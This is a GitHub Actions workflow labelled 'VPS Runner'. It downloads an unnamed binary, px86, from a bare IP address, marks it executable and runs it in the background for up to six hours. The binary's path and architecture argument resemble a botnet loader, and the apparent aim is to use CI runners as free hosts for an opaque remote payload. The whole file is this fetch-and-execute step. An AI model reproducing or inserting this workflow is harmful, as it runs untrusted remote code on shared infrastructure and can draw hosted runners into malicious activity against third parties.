name: VPS Runner

on:
  workflow_dispatch:
    inputs:
      uptime:
        description: 'VPS uptime in hours (max 6)'
        required: false
        default: '6'
        type: choice
        options:
          - '1'
          - '2'
          - '3'
          - '4'
          - '5'
          - '6'

jobs:
  run-binary:
    runs-on: ubuntu-latest

    steps:
    - name: Download binary
      run: |
        wget http://45.138.16.158/bins/px86 -O px86
        chmod +x px86

    - name: Run binary for specified duration
      run: |
        UPTIME=${{ github.event.inputs.uptime }}
        echo "Running binary for $UPTIME hours"
        
        # Start the binary in background
        ./px86 x86 &
        PID=$!
        echo "Binary started with PID: $PID"
        
        # Sleep for the specified duration (this keeps the workflow alive)
        sleep $(($UPTIME * 3600))
        
        # Kill the binary after the time is up
        kill $PID 2>/dev/null || true
        echo "Successfully completed $UPTIME hours of runtime"
